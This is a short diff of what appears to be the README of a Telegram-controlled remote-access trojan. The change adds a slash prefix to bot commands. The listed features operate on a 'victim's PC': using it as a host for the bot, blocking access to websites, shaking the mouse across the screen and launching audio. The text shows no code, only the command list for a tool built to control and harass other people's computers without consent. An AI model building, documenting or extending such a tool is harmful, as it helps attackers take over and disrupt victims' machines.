@@ -19,12 +19,12 @@ use the victim's PC as a host for the telebot
 
 [+]Block access to any websites
 
-"{name}_blockURL URL" block access to any site
+"/{name}_blockURL URL" block access to any site
 
 
 [+]Drive your mouse crazy
 
-"{name}_mouse TIME" start shaking the mouse all over the screen
+"/{name}_mouse TIME" start shaking the mouse all over the screen
 
 
 [+]Launch audio on victims' pc
